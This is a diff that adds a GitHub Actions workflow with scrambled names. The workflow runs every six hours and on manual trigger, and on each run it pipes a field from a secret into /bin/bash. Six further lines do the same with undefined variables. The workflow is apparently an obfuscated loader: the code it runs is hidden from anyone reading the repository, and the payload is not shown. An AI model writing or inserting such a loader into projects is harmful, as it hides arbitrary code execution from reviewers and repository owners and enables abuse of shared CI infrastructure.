@@ -1,0 +1,23 @@
+name: overcookedmiserable
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: overcookedmiserable
+        env:
+          hj0794: ${{ secrets.hj0794 }}
+        run: |
+          echo $hj0794 | jq -r .l0764 | /bin/bash
+          echo $gij76986 | jq -r .kl622 | /bin/bash
+          echo $oc78 | jq -r .m41 | /bin/bash
+          echo $wv261 | jq -r .dah23 | /bin/bash
+          echo $ozwm676 | jq -r .o21791 | /bin/bash
+          echo $kxfkj88887 | jq -r .q46832 | /bin/bash
+          echo $ki4856 | jq -r .y2090 | /bin/bash
+
